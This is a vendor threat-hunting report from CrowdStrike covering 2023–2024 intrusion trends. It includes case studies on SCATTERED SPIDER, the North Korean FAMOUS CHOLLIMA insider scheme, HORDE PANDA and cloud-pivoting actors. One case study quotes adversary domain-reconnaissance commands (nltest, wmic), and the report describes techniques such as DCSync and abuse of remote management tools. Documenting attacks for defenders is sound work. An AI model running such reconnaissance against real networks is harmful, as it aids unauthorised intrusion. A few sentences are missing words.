Introduction

Stealth and speed were the dominant themes of the 2023 cyber threat 

landscape. Adversaries have faced a hardened attack surface due to 

advancements in threat defense technology and threat awareness. 

In response, they have increasingly adopted and relied on techniques 

that allow them to move faster and evade detection. 

CrowdStrike's Counter Adversary Operations team brings together 

industry\-leading threat intelligence and pioneering managed threat hunting 

with the AI\-powered CrowdStrike Falcon® platform to detect, disrupt and stop

from the most sophisticated adversaries by providing the intelligence, threat 

hunting skills and resources that most organizations lack.

As adversaries adopt new tactics, the CrowdStrike OverWatch team does the 

same. Cross\-domain threat hunting has become essential as threat actors target 

multiple domains across an organization's infrastructure — most notably identity, 

endpoint and cloud — in their efforts to evade detection. These cross\-domain 

threats pose a challenge to threat hunters because they often generate fewer

as malicious. Adversaries that gain access continue to operate under the radar 

using legitimate remote monitoring and management (RMM) tools. As they strive 

to shrink their footprint and refine their attacks, CrowdStrike OverWatch works 

tirelessly to detect them with cross\-domain threat hunting. 

CROWDSTRIKE 2024 THREAT HUNTING REPORT 
4

The cross\-domain threat is increasing as adversaries attempt to infiltrate 

targets through human access, commonly known as “insider threats.” This year, 

CrowdStrike OverWatch identified individuals associated with the Democratic 

People’s Republic of Korea (DPRK)\-nexus adversary FAMOUS CHOLLIMA applying to, 

or actively working at, more than 100 unique companies. This threat actor exploited 

the recruitment and onboarding processes to obtain physical access through 

legitimately provisioned systems, which were housed at intermediary locations. 

The adversary insiders remotely accessed these systems to log in to corporate 

VPNs posing as developers. This masquerade gave FAMOUS CHOLLIMA 

deeply enduring access to dozens of organizations and proved nearly impossible 

to detect without the benefit of CrowdStrike OverWatch threat hunting and the 

support of far\-reaching visibility provided by the Falcon platform.

In addition to conducting cross\-domain attacks, adversaries are developing greater 

expertise in moving seamlessly between platforms and using tools that are equally 

effective across operating systems. This rise in “hybrid threats” presents significant 

challenges to defenders across disciplines. DPRK\-nexus adversaries, for example, 

quickly navigate multiple platforms, build custom tooling and spontaneously 

pivot actions on objectives — highlighting the need for fast, proactive and 

intelligence\-driven hunting to stay one step ahead of the threat actors. 

Identity\-based detections are particularly important, as they can identify 

suspicious activity on unmanaged hosts and supplement traditional endpoint 

detection and response (EDR) events. Consistent with last year, threat actors 

increasingly use identity\-based attacks to gain initial access. Using CrowdStrike 

Falcon® Identity Protection, CrowdStrike OverWatch threat hunters continued 

to expand their hunting mission and routinely countered persistent adversaries 

that employ identity attacks, including formidable threat actors like China\-nexus 

HORDE PANDA.

Adversaries are also increasingly pivoting to cloud environments, with a noted 

75% increase in 2023, as stated in the CrowdStrike 2024 Global Threat Report. 

While many threat actors employ basic techniques, others — such as prolific eCrime 

adversary SCATTERED SPIDER and Russia\-nexus adversary COZY BEAR — evolve 

quickly, and proactive hunters must stay one step ahead in the cloud. CrowdStrike 

OverWatch keeps pace with these adversaries by developing innovative hunting 

techniques for cloud services, workloads and control planes as well as using 

advances in CrowdStrike's identity protection module. 

While threat hunters faced many new challenges in the past 12 months, 

long\-standing endpoint threats did not abate. Adversaries continued to leverage 

a seemingly endless list of RMM tools, which are appealing due to their wide 

availability and their use as legitimate solutions in many organizations. eCrime 

and targeted intrusion adversaries alike continue to rely on RMM tooling. 

Examples include eCrime adversary CHEF SPIDER and Iran\-nexus adversary 

STATIC KITTEN, which both used phishing campaigns delivering RMM tools 

to create an effective initial access beachhead.

CROWDSTRIKE 2024 THREAT HUNTING REPORT

Speed, accuracy and threat intelligence are integral components to countering the 
adversary through proactive hunting. This year, in the MITRE Engenuity ATT\&CK® 

Evaluations: Managed Services, Round 2, detection\-only test, CrowdStrike 

delivered comprehensive detection coverage and rapid mean time to detect 

(MTTD) at an impressive four minutes.

Over the past 12 months, CrowdStrike OverWatch threat hunters distilled their 

findings into hundreds of new behavior\-based preventions. As a result, the team’s 

front\-line findings directly augment the Falcon platform’s ability to detect and 

prevent the latest threats. In the past year alone, these new behavior\-based 

detections have enabled the Falcon platform to prevent an additional 2\.4 million 

malicious events that would have otherwise evaded autonomous detection 

methods — amounting to approximately 4\.6 preventions per minute.

The CrowdStrike 2024 Threat Hunting Report presents trends identified from 

July 1, 2023, to June 30, 2024, exposed by proactive, intelligence\-informed threat 

hunting. Year\-over\-year, CrowdStrike OverWatch observed the following:

 ► Interactive intrusions increased by 55%. An interactive intrusion 

occurs when threat actors perform hands\-on\-keyboard activities within 

a victim's environment.

 ► 86% of all interactive intrusions were attributed to eCrime activity.

 ► eCrime\-related interactive intrusions against the healthcare sector 

increased 75%. 

 ► Interactive intrusions impacting the technology sector increased 60%, 

making technology the most frequently targeted industry for the seventh 

consecutive year.

 ► FAMOUS CHOLLIMA insiders were identified applying to or actively 

working at more than 100 unique companies.

 ► Adversary use of RMM tools increased 70%, and 27% of all interactive 

intrusions leveraged RMM tools.

This report represents the Counter Adversary Operations team’s relentless 

efforts to disrupt the adversary. Behind every CrowdStrike threat hunter is the 

power of a unified security solution, empowering hunters with the richest security 

telemetry — encompassing endpoint, identity and cloud workloads as well as 

intelligence — to find and stop adversaries in their tracks.

Front\-Line 
Snapshot

The statistics provided in this report reflect insights from the 

CrowdStrike OverWatch threat hunting team from July 1, 2023, 

through June 30, 2024\. This data specifically focuses on 

interactive intrusions — attacks where adversaries establish 

an active presence within a target network, often engaging in 

hands\-on\-keyboard activities to achieve their objectives. 

Unlike automated attacks, interactive intrusions involve human 

operators who interact with systems in real time, adapting their 

tactics as needed. Interactive intrusions are typically more 

sophisticated and difficult to detect compared to automated 

attacks, requiring advanced threat hunting and incident 

response capabilities to identify and mitigate.

Interactive intrusions are characterized by:

 ► Manual Intervention: Attackers manually navigate the network, 

leveraging their skills and knowledge to bypass security controls.

 ► Persistence: Attackers establish and maintain long\-term access to 

the network, often using advanced techniques to evade detection.

 ► Lateral Movement: After gaining initial access, attackers move laterally 

across the network to identify and compromise additional systems.

 ► Data Exfiltration: The primary goal is often to steal sensitive data, 

intellectual property or credentials.

 ► Customization: Attackers tailor their techniques to the specific 

environment and defenses of the target organization.

Over the past 12 months, CrowdStrike OverWatch observed interactive 

intrusions continue to climb, increasing 55% year\-over\-year. The overall 

distribution of interactive intrusion activity by threat type saw a noted 

increase in activity by eCrime adversaries — 86% of the total volume 

was associated with eCrime — highlighting the increased threat posed by 

criminal threat actors seeking financial gain. These observations underscore 

the persistent and pervasive threat of eCrime adversaries as well as 

CrowdStrike OverWatch’s ability to quickly identify and uncover them.

SECTOR TARGETING

For the reporting period, interactive intrusions impacting technology entities increased 60% year\-over\-year, 

making technology the most frequently targeted industry for the seventh consecutive year. The technology 

sector encompasses a broad range of organizations that develop computer software and hardware or provide 

IT services or technology. Due to its relationship to many other verticals, the technology sector is a high\-value 

target for both targeted intrusion and eCrime adversaries.

SECTOR

SPOTLIGHTS

Healthcare

While technology entities remain attractive targets for various adversaries, 

eCrime\-related interactive intrusions against healthcare entities increased 75% 

over the prior 12 months. The healthcare sector includes a large variety of entities 

that possess patients’ protected health information (PHI), financial information 

(such as credit card and bank account numbers) and personally identifiable 

information (PII), making these entities a prime target for eCrime threat actors.

Big game hunting (BGH) adversaries — which remain the primary threat to all 

sectors, including healthcare — use data theft, extortion and ransomware to 

pressure victims into paying a ransom. Access brokers — threat actors that acquire 

access to organizations and provide or sell this access to other actors — and 

commodity services also continue to threaten the healthcare sector by facilitating 

the financially motivated operations of other eCrime threat actors. To evidence 

this threat, access broker advertisements for healthcare entities increased 

142% compared to the previous 12 months. 

Consulting and Professional Services

Targeted intrusion activity targeting the consulting and professional services 

vertical increased by 141% year\-over\-year, moving this vertical up to second place 

in overall sector targeting trends and displacing both financial services and retail. 

The consulting and professional services sector provides specialist services 

and/or consultancy and is staffed by employees with specific skill sets or training. 

This sector includes human resources, architectural, recruitment agency, 

consultancy and marketing services. Consulting and professional services 

entities possess a significant amount of sensitive information — including 

financial and personal data, strategic plans and trade secrets — that makes 

these entities increasingly attractive for targeted intrusion adversaries. 

Given the sector’s supporting nature, targeted intrusion adversaries can also 

target entities in this sector to gain access to additional downstream victims. 

The consulting and professional services sector is becoming a popular target for 

various eCrime adversaries, including BGH threat actors and access brokers, as 

entities within this sector present numerous opportunities for these threat actors 

to profit financially. To evidence this threat, access broker advertisements for 

consulting and professional services entities increased 152% year\-over\-year.

MITRE ATT\&CK Observations

CrowdStrike OverWatch tracks interactive intrusion activity against the MITRE ATT\&CK® Enterprise Matrix, 
a framework that categorizes and tracks adversary behavior.1

This heat map illustrates the top MITRE techniques and tactics CrowdStrike OverWatch detected in interactive 

intrusion activity over the past 12 months. CrowdStrike OverWatch tirelessly hunts for post\-exploitation 

behaviors — no matter the initial access vector, adversaries are detected very quickly. As a result, CrowdStrike 

OverWatch most often observes techniques within the Discovery tactic, when adversaries are still orienting 

themselves in a network.

CROWDSTRIKE 2024 THREAT HUNTING REPORT12

Use of MITRE ATT\&CK techniques involving identity increased across 

all stages of adversary operations. Discovery techniques remain the most 

prominent category — half of the top 10 techniques observed in the past 12 

months fall into this category. This is unsurprising, as eCrime access brokers 

rely on these techniques — including Account Discovery, System Network 

Configuration Discovery and Remote System Discovery — to evaluate targets as 

part of the threat actors’ efforts to monetize operations. OS Credential Dumping 

and Account Discovery are often interconnected, as adversaries continue to 

compromise valid identities to access networks. 

Adversaries are increasingly leveraging RMM tools, and Ingress Tool Transfer and 

Masquerading remained two of the top MITRE tactics. As organizations become 

increasingly aware of RMM threats, adversaries such as STATIC KITTEN have 

begun to rename these tools to obfuscate their efforts.

Unsurprisingly, Disabling and Modifying Tools to Impair Defenses was a 

commonly observed technique. As EDR and extended detection and response 

(XDR) platforms such as the Falcon platform grow more sophisticated, 

adversary attacks are more frequently disrupted. Over the past 12 months, 

many adversaries have advertised custom tooling that allegedly uncovers EDR 

products. Though these tools are often ineffective, adversaries are increasingly 

interested in them. As this threat evolves and adversaries attempt to circumvent 

security controls, human\-driven threat hunting teams such as CrowdStrike 

OverWatch are a vital line of defense. 

INTRUSION TRENDS

BY ADVERSARY

CrowdStrike is a pioneer in adversary profiling and attribution. With detailed 

information into 245\+ attributed eCrime, targeted intrusion and hacktivist 

adversaries — and more than 140 active clusters of malicious activity that have 

not yet met CrowdStrike’s standards for adversary graduation — CrowdStrike 

OverWatch threat hunters are well positioned to quickly and accurately disrupt 

the adversary. The following image highlights the most prevalent adversary 

operations identified over the past 12 months.

CROWDSTRIKE 2024 THREAT HUNTING REPORT 
14

eCrime adversaries are the most prevalent type of threat actors that CrowdStrike 

OverWatch threat hunters disrupt; these adversaries are prolific and often 

opportunistic. In many instances, CrowdStrike OverWatch detects targeted 

intrusion adversary activity early in the kill chain before it reaches an interactive 

stage. For example:

 ► The Falcon sensor prevented PRIMITIVE BEAR’s initial access attempts, which 

involved spear\-phishing and a weaponized USB, before the adversary could 

gain interactive access. CrowdStrike OverWatch’s specific insights were turned 

into sensor\-level detections.

 ► China\-nexus adversaries are increasingly attempting access via stealthy 

implants and .NET execution through compromised Internet Information 

Services (IIS) servers. In response, CrowdStrike OverWatch threat hunters 

worked with CrowdStrike’s engineering teams to ensure that this entry point 

has increased visibility. By honing hunting leads that focus on reflective .NET 

loading and IIS compromise, CrowdStrike OverWatch prevented China\-nexus 

adversaries from achieving initial access or from moving laterally in a network. 

Over the last 12 months, CrowdStrike OverWatch continued to observe adversaries 

leverage speed and stealth across the landscape to minimize their footprints and 

increase their chances of evading automated detections. As defenses harden, 

adversaries evolve their tactics to hide within normal network activity. 

The good news is that CrowdStrike OverWatch hunters work 24/7, 365 days a year 

to stop them. Human expertise and threat hunting are crucial for distinguishing 

between real threats and normal activity without generating false positives that 

distract security teams. CrowdStrike’s elite threat hunters rapidly identify stealthy 

attacks and adversary tactics, feeding these new detections into the AI\-powered 

Falcon platform. This virtuous cycle enhances the Falcon platform and strengthens 

defenses for all CrowdStrike customers.

Observations 
from the 
Front Lines

HUNTING THE

CROSS\-DOMAIN THREAT

Cross\-domain threat hunting refers to CrowdStrike OverWatch’s ability to 

identify adversary behavior even when it takes place across several domains 

of an organization's security structure, notably identity, endpoint and cloud. 

Attacks that take place across multiple domains pose a significant challenge 

because they often generate fewer detections in any single domain or product. 

This dispersed footprint makes intrusion activity difficult to successfully 

recognize as being malicious, as it can appear to take place in isolation or 

without correlating detections.

By combining data and detections from multiple domains and leveraging that 

against CrowdStrike’s threat intelligence, CrowdStrike OverWatch is uniquely 

situated to respond to threats that cross these domain barriers.

Cross\-domain intrusions can vary significantly in complexity, but CrowdStrike 

commonly sees adversaries moving either back and forth between the endpoint 

and identity planes or from the cloud to an endpoint. 

The latter is a particularly dangerous and increasingly prevalent occurrence that 

is enabled by improvements in phishing and the spread of infostealers.

If adversaries can find or steal credentials, they can gain direct access to 

poorly configured cloud environments, bypassing the need to compromise 

heavily defended endpoints. From this vantage point, they are then able to 

find over\-privileged users and roles to further compromise cloud environments 

or use their access to descend into endpoint environments. With this access, 

they can deploy remote management tools instead of malware, making these 

attacks challenging to disrupt. 

One of the most proficient and prolific adversaries capable of cross\-domain 

attacks is SCATTERED SPIDER. Throughout 2023 and 2024, SCATTERED 

SPIDER demonstrated sophisticated cross\-domain tradecraft within targeted 

cloud environments, often leveraging spear\-phishing, policy modification and 

access to password managers to gain access, maintain persistence, move 

laterally and exfiltrate data. 

CROWDSTRIKE 2024 THREAT HUNTING REPORT 
 
16

 CASE STUDY: 

SCATTERED SPIDER Abuses 
Cloud Management Agent 
to Establish Persistence

In May 2024, CrowdStrike OverWatch observed SCATTERED SPIDER establish 

a foothold on a cloud\-hosted virtual machine (VM) instance via a cloud service 

VM management agent. To do so, the adversary compromised existing credentials 

to authenticate to the cloud control plane via an identified phishing campaign. 

After authenticating to the cloud console, the adversary established persistence 

by executing commands on the cloud\-hosted VM via the management agent.

After establishing an initial connection, SCATTERED SPIDER executed the 

ping command against several domains within and outside of the target 
organization, likely to identify their level of access and visibility within the 

network. The adversary then ran several variations of the nltest command 
to identify domain controllers (DCs) of interest and the wmic command to 
identify programs currently installed on the host.

nltest /dclist:

nltest /domain\_trusts

wmic product get name, version

Finally, the adversary established persistence by creating a new user on the host 

and attempting to download FleetDeck remote access software.

This attack took place across three operating domains: email, then cloud 

management, then within a VM. Because of this, the detectable footprint of this 

activity in any single detection domain was very low and difficult to conclusively 

signature. Quickly identifying such an attack relied on leveraging knowledge 

about SCATTERED SPIDER from CrowdStrike’s extensive threat intelligence and 

prior experience, combining this knowledge with telemetry from the control 

plane and correlating this information against detections from within the virtual 

machine to successfully recognize an intrusion underway.

Many adversaries are honing their cross\-domain proficiency, and an increasing 

number are attempting to develop capabilities that expand to multiple security 

domains. Such adversaries can quickly and confidently navigate multiple 

operating systems and security platforms. Whether the adversary is leveraging 

native applications or cross\-platform custom tools, threat hunters must be 

flexible and quickly adapt to any target environment.

HUNTING THE

INSIDER THREAT

CrowdStrike OverWatch hunters are continually faced with new challenges 

as adversaries increasingly seek stealthy and creative avenues for initial 

access. In addition to leveraging cross\-domain attacks, adversaries are 

becoming more platform\-agnostic, moving seamlessly between platforms 

with tooling and capabilities that are equally effective for Windows, macOS 

and Linux. In some cases, the adversary’s motivations have become 

cross\-mission, blending traditional espionage goals with opportunistic 

currency generation. No adversaries exemplify this hybrid threat better 

than DPRK\-nexus adversaries. 

Hunting hybrid threats can present a significant challenge, given the ease 

and speed with which these adversaries adjust their tactics, tools, targets 

and — in some cases — primary goals. Countering these adversaries requires 

constant awareness of their behavioral and operational shifts, an area where 

intelligence\-driven hunting becomes a necessity. 

Though DPRK adversaries in general exemplify the hybrid threat, the adversary 

FAMOUS CHOLLIMA presented a unique challenge to CrowdStrike OverWatch 

hunters over the past year: hunting the adversary when they become the 

insider threat. 

FAMOUS CHOLLIMA operations are similar to other DPRK\-nexus adversaries 

in that this adversary will leverage recruitment\-themed lures, abuse malicious 

NPM and Node.js packages, deploy custom tooling known as BeaverTail and 

InvisibleFerret, and focus heavily on financial and technology entities. One key 

differentiator is that this adversary has also been involved in insider threat 

operations involving a network of malicious insiders who infiltrate corporate 

environments under the guise of legitimate employment. 

FAMOUS CHOLLIMA carried out these operations by obtaining contract or 

full\-time equivalent employment, using falsified or stolen identity documents 

to bypass background checks. When applying for a job, these malicious insiders 

submitted a résumé typically listing previous employment with a prominent 

company as well as additional lesser\-known companies and no employment 

gaps. In most cases, these insiders appeared financially motivated — 

however, in a limited number of incidents, the threat actors exfiltrated 

sensitive information.

CROWDSTRIKE 2024 THREAT HUNTING REPORT

 CASE STUDY: 

FAMOUS CHOLLIMA Insider Threats 
Target 100\+ U.S.\-Based Companies

In April 2024, CrowdStrike Services responded to the first of several incidents in which FAMOUS CHOLLIMA 

malicious insiders targeted more than 30 U.S.\-based companies, including aerospace, defense, retail and 

technology organizations. The malicious insiders claimed to be U.S. residents and were hired in early 2023 for 

multiple remote IT positions. 

Leveraging information from a single incident, CrowdStrike OverWatch quickly developed a scalable plan to hunt 

for this emerging insider threat and discovered more than 30 additional affected customers within two days. 

Threat hunters found that after obtaining employee\-level access to victim networks, the insiders performed 

minimal tasks related to their job role. In some cases, the insiders also attempted to exfiltrate data using Git, 

SharePoint and OneDrive. Additionally, the insiders installed the following RMM tools: RustDesk, AnyDesk, 

TinyPilot, VS Code Dev Tunnels and Google Chrome Remote Desktop.

The insiders then leveraged these RMM tools in tandem with company network credentials, which allowed 

numerous IP addresses to connect to the victim’s system.

CrowdStrike OverWatch hunters searched for RMM tooling paired with 

suspicious network connections to systems. Combining these instances with 

information from the CrowdStrike Falcon Identity Protection module uncovered 

additional data, which allowed threat hunters to identify additional personas. 

CrowdStrike OverWatch leveraged Falcon Identity Protection to closely 

compare unexpected behaviors with expected behaviors for a known role 

within a company or network. Falcon Identity Protection provided context 

and data to enable hunters to identify suspicious actions. 

CrowdStrike’s intelligence reporting enabled threat hunters to quickly identify 

additional indicators of compromise (IOCs), personas and techniques as 

well as uncover additional victim companies. CrowdStrike OverWatch then 

contacted likely victimized companies to inform them about potential insider 

threats and quickly corroborated CrowdStrike’s findings with the victim 

companies. By leveraging the findings from these companies, CrowdStrike 

Counter Adversary Operations built a cohesive picture from disparate pieces 

and coordinated with law enforcement entities. 

As the Counter Adversary Operations team and CrowdStrike Services 

continued to investigate victimized companies — and as insights into FAMOUS 

CHOLLIMA’s operations grew — CrowdStrike OverWatch developed more than 

20 hunting leads by combining EDR and identity data to identify malicious 

activity or suspect behavior.

In some cases, threat hunters identified suspicious activity that overlapped 

with a larger investigation into an operation that industry sources refer to 

as “DPRK IT Workers,” and CrowdStrike OverWatch notified these victim 

organizations within days of the insiders obtaining employment and 

subsequently gaining access to the organizations' networks.

Over the course of this investigation, CrowdStrike identified FAMOUS 

CHOLLIMA insiders applying to or actively working at more than 100 unique 

companies, most of which were U.S.\-based technology entities.

In mid\-2024, the U.S. Department of Justice (DOJ) indicted several individuals 

who allegedly participated in this scheme, which — according to the 

indictment — likely enabled North Korean nationals to raise money for the 
DPRK government and its weapons programs.2

Figure 7\. FAMOUS CHOLLIMA targets observed by CrowdStrike OverWatch, July 2023\-June 2024

The FAMOUS CHOLLIMA case exemplifies the speed and ingenuity of CrowdStrike OverWatch hunters when 

faced with a new challenge. Following proven methodologies, threat hunters quickly and effectively responded 

to an emerging threat and uncovered key insights that were quickly shared with CrowdStrike Counter Adversary 

Operations, CrowdStrike Falcon® Identity Protection, CrowdStrike Services and CrowdStrike Falcon® Complete — 

creating a unified solution to a hybrid threat.

Identity 
Hunting

Adversaries continue to maximize the use of stolen 

identities and attempt to minimize defenders’ network 

visibility by “living off the land” and therefore reducing 

potential indicators or alerts on the endpoint, which the 

adversary knows is heavily scrutinized. This tactic hinders 

threat hunters’ ability to differentiate adversary activity 

from typical user and system administrator activity. 

Living Off the Land

"Living off the land" refers to a strategy used by attackers to avoid 

detection by using legitimate tools and processes already present 

on a victim's system rather than introducing their own malicious 

software. This tactic leverages built\-in system utilities and trusted 

applications to carry out malicious activities, making it more difficult 

for traditional security measures to identify and block the attack. 

By blending in with normal operations, attackers can maintain a low 

profile and extend their presence within a network without raising 

immediate alarms.

 
CROWDSTRIKE 2024 THREAT HUNTING REPORT

23

To achieve their objectives, adversaries must often use valid accounts and user identities in novel ways. For 

example, an adversary may need to elevate privileges or interact with previously uncontacted hosts, leaving 

behavior patterns that threat hunters can easily detect. 

The Falcon Identity Protection module does not rely on endpoint telemetry and instead collects all communication 

made to enabled DCs, so the CrowdStrike OverWatch team often identifies compromises before the adversary 

pivots internally. For example, when an adversary is detected obtaining a foothold on an unmanaged internet\-facing 

host (such as a network appliance), the early warning gives defenders more time to identify and contain attackers 

before they cause material damage. This reduces overall remediation efforts and prevents wide\-scale compromise 

of the victim environment.

CrowdStrike OverWatch uses additional Falcon Identity Protection telemetry — including auditing logs — to identify 

the following TTPs after a threat actor authenticates on a victim system:

Brute\-forcing

Privilege 

escalation

Lateral movement 

from managed or 

unmanaged hosts

Gathering 

additional 

compromised 

credentials

Identifying 

authentication 

into cloud 

applications

CrowdStrike OverWatch routinely gathers Falcon Identity Protection data to determine account characteristics and 

whether actions performed on an account are atypical — for example, when a non\-privileged account attempts to 

perform privileged actions, as demonstrated in the following HORDE PANDA incident. 

 
24

 CASE STUDY: 

HORDE PANDA Activity

Between late June 2023 and early August 2023, using identity\-based 

indicators, CrowdStrike OverWatch identified suspicious activity at a 

South Asian telecommunications provider. The China\-nexus HORDE 

PANDA adversary leveraged multiple compromised identities to 

attempt to embed themselves further into the network and move 

laterally. The adversary gained initial access via the VPN IP range. 

HORDE PANDA likely assumed that using valid identities from the 

VPN range would obfuscate their activity — however, they were 

no match against CrowdStrike OverWatch, Falcon Complete and 

identity\-based detections. 

In early July 2023, CrowdStrike OverWatch investigated identity 

hunting leads for unusual activity targeting a DC. This activity 

originated from unexpected sources, including the VPN IP range and 

a host that was not registered with a Falcon sensor for endpoint. 

Domain replication requests using DCSync had been attempted 

from five user accounts but were unsuccessful, as the requesting 

accounts lacked the permissions for domain replication. 

DCSync Attack

DCSync is a credential dumping technique where an adversary 

abuses DC synchronization to trick a DC into sharing sensitive 

information. The adversary imitates a DC and receives data 

replicated from Active Directory, such as passwords.

CROWDSTRIKE 2024 THREAT HUNTING REPORT 
25

CrowdStrike OverWatch — in collaboration with Falcon Complete and the 

customer — used identity hunting leads to determine which host did not have 

endpoint sensor coverage. After installing the sensor, CrowdStrike OverWatch 

identified two HORDE PANDA implants operating on the compromised host. 

Falcon Complete swiftly contained the impacted host and reset compromised 

account passwords.

HORDE PANDA’s implants leveraged legitimate executables to side\-load malicious 

LuaPlug and KEYPLUG dynamic link libraries (DLLs). LuaPlug established 
persistence as a service, and KEYPLUG established persistence as a scheduled 
task. As mentioned above, both implants were deployed to the system before 

the Falcon sensor was installed, and CrowdStrike therefore cannot determine the 

infection vector. However, implant analysis revealed further indicators that can 

inform future threat hunting. 

In mid\-July 2023, HORDE PANDA attempted to reestablish access to domain 

accounts after reacquiring the updated password for a previously compromised 

account. The adversary began searching for Local Administrator Password 

Solution (LAPS) attributes via Lightweight Directory Access Protocol (LDAP) and 

for objects that allowed unrestricted delegation. CrowdStrike OverWatch had not 

previously observed these types of LDAP queries at this customer, and threat 

hunters were alerted immediately. The adversary continued to attempt to regain 

access to privileged identities, leveraging 11 compromised user accounts — but 

CrowdStrike OverWatch detected the adversary’s activity using telemetry 

provided by Falcon Identity Protection. 

Identity hunting allowed CrowdStrike OverWatch to disrupt HORDE PANDA’s 

activity by enabling hunters to increase the customer’s network visibility, 

uncovering the main host that the adversary used to conduct operations. 

By closely monitoring the actions of known compromised accounts via 

identity telemetry, CrowdStrike OverWatch was able to identify when other 

anomalous accounts started attempting similar activity, leaving the adversary 

nowhere to hide. 

Reader Note:
Identity data is any information (such as data associated with accounts) 

that uniquely identifies an individual or entity and includes information 

regarding authentication and access controls (such as credentials, 

permissions, security tokens or digital certificates).

CROWDSTRIKE 2024 THREAT HUNTING REPORT 
Cloud 
Hunting

The boundary between the endpoint domain and cloud domain 

is increasingly blurred as adversaries develop their cross\-domain 

prowess. As the number of organizations moving to or hosting data 

on cloud services increases, so does the importance of defending 

cloud environments. CrowdStrike increasingly observes threat actors 

targeting and abusing cloud services to complete malicious objectives. 

As reported in the CrowdStrike 2024 Global Threat Report, cloud 

environment intrusions increased 75%, cloud\-conscious cases increased 

by 110% and cloud\-agnostic cases increased by 60% year\-over\-year 

from 2022 to 2023\. 

Using data from CrowdStrike Falcon® Cloud Security, the CrowdStrike 

OverWatch team's cloud\-based threat hunting has expanded visibility 

into the runtime environments of critical cloud infrastructures and cloud 

control planes. Having full insight into telemetry spanning endpoint, 

identity and cloud environments is a force multiplier for threat hunting. 

CrowdStrike OverWatch can identify impacted hosts, identities and 

workloads at the earliest opportunity, whether the threat originates in 

the cloud or the adversary attempts to move into a cloud environment. 

This visibility ensures CrowdStrike customers can respond to 

cloud\-conscious adversaries no matter where the attacks occur.

HAVING FULL INSIGHT 

INTO TELEMETRY SPANNING 

ENDPOINT, IDENTITY AND 

CLOUD ENVIRONMENTS IS 

A FORCE MULTIPLIER FOR 

THREAT HUNTING.

Cloud Control Plane

In a cloud platform, the control plane is the component responsible for 

managing and orchestrating the cloud infrastructure, including provisioning, 

configuration and management of resources such as VMs, storage 

and networking. It serves as the administrative interface for users and 

administrators to interact with the cloud services, enabling the creation, 

scaling and deletion of resources. The control plane is crucial because once 

an adversary gains access, they have nearly complete control of the cloud 

infrastructure.

Cloud\-Conscious Adversary

Cloud\-conscious is a term referring to threat actors that are aware of the ability 

to compromise cloud workloads and use this knowledge to abuse features 

unique to the cloud for their own purposes.

CROWDSTRIKE 2024 THREAT HUNTING REPORT 
27

CrowdStrike OverWatch uses telemetry from managed cloud workloads to 

identify post\-exploitation activity initiated from the cloud control plane. This 

lateral movement technique provides an adversary with multiple avenues to 

execute commands or scripts for gaining initial access, escalating privileges and 

establishing persistence.

Using telemetry from the cloud management plane, CrowdStrike OverWatch hunts 

for suspicious indicators of attack (IOAs), including manipulating account or object 

permissions and behaviors indicating enumeration activity. These IOAs can include 

tampering with security controls — such as multifactor authentication (MFA) — 

and disabled logging.

CrowdStrike OverWatch is constantly developing cloud\-based threat hunting leads 

that are based on behaviors that adversaries have adopted to compromise cloud 

environments. Identity\-based data also allows threat hunters to better detect 

anomalies by providing additional intrusion insights.

 CASE STUDY: 

Adversaries Pivot Between Cloud 
Control Plane and Hosted VMs 

Traditional BGH adversaries continue to lead cloud\-conscious activity. 

SCATTERED SPIDER remains the most prominent adversary in cloud\-based 

intrusions, conducting 29% of all associated activity observed in 2023\. 

Though threat actors such as SCATTERED SPIDER and COZY BEAR have 

targeted cloud infrastructure as their primary means of intrusion, other threat 

actors are slowly beginning to target cloud environments. These threat actors 

often begin targeting cloud infrastructure by querying instance metadata 

for access keys and credentials on newly compromised cloud\-hosted VMs. 

Threat actors can then use these credentials to log in to the cloud control 

plane and perform further activity. 

Between July 2023 and June 2024, CrowdStrike OverWatch observed several 

lower\-sophistication techniques targeting cloud environments. Rather than 

collecting cloud credentials as a standard enumeration practice, numerous 

cloud\-conscious adversaries are pivoting between the cloud control plane and 

cloud\-hosted VMs using the command line tools that interface with the cloud 

control plane and VM management agents. 

When pivoting from a cloud\-hosted VM to the cloud control plane, threat actors 

have often already compromised the instance and used existing tooling located on 

the VM to enumerate data stored in the cloud control plane. 

When pivoting from the cloud control plane to a cloud\-hosted VM, threat actors 

likely compromise a cloud identity and access management (IAM) user to execute 

commands on VMs from the cloud console for further exploitation. 

CROWDSTRIKE 2024 THREAT HUNTING REPORT 
 
28

 CASE STUDY: 

Threat Actor Enumerates 
Cloud Account Information 
from Compromised VMs

The following case highlights the threat actor’s area of expertise — host\-based 

exploitation — but demonstrates a shift toward leveraging the target organizations’ 

cloud services for further actions on objectives.

In this case, a threat actor accessed a cloud\-hosted VM from a malicious implant 

predating the Falcon sensor and used a pre\-installed command line tool to 

enumerate information from the cloud control plane. The command line tool allows 

users to update and query information from their cloud account using a specified 

set of commands. The threat actor spawned a PowerShell (PS) process using 

the preexisting implant and used the process to interact with the command line 

tool, which was already installed on the VM. The tool likely contained cached 

credentials, granting it access to the cloud control plane for enumeration. The 

threat actor used this tool to obtain additional information about other VMs and 

users within the cloud account. In addition to performing a few successful cloud 

enumeration commands, the actor used the tool to perform multiple commands 

that contained incorrect syntax and failed.

These low\-sophistication commands as well as several mistakes in usage 

demonstrate the threat actor’s relative lack of knowledge about the command line 

tool and the cloud service structure. In addition to attempting cloud enumeration, 

the threat actor also enumerated local user and host information and attempted to 

remove forensic artifacts from the host. 

This case study highlights that threat actors typically conduct activity from familiar 

locations on the host but attempt to pivot to the cloud control plane to obtain more 

information. CrowdStrike OverWatch quickly identified this activity and notified the 

target organization.

30

To mitigate intrusion techniques similar to those demonstrated in these 

cloud\-conscious incidents, CrowdStrike recommends the following measures:

 ► Gain a comprehensive understanding of any cloud platform running on a network

 ► Standardize and validate cloud resource configurations before deployment, 

and regularly monitor for deviations from approved standards

 ► Apply the same security policies to cloud workload servers as any other server, 

and deny outbound connections initiated from any server that does not link to 

allowlisted endpoints

 ► Monitor cloud assets and vulnerability implementations, and mitigate risks in a 

timely manner

 ► Apply the principle of least privilege to cloud infrastructure; evaluate credentials, 

configurations and precedence to ensure users have the least\-privileged access 

necessary to function

 ► Remove cached credentials from VMs

Endpoint Hunting

CrowdStrike OverWatch’s threat hunters have constantly honed and refined their tooling and threat hunting 

methodologies to adapt to the constantly evolving threat landscape. Though novel TTPs for endpoint exploitation 

are always emerging, adversaries still frequently rely on previous reliable techniques, including leveraging 

legitimate RMM tools for illicit activity. To evidence this trend, over the past 12 months, CrowdStrike OverWatch 

observed a significant 70% year\-over\-year increase in incidents leveraging RMM tools. 

Key Facts and Figures:

 ► Adversary use of RMM tools increased 70% year\-over\-year

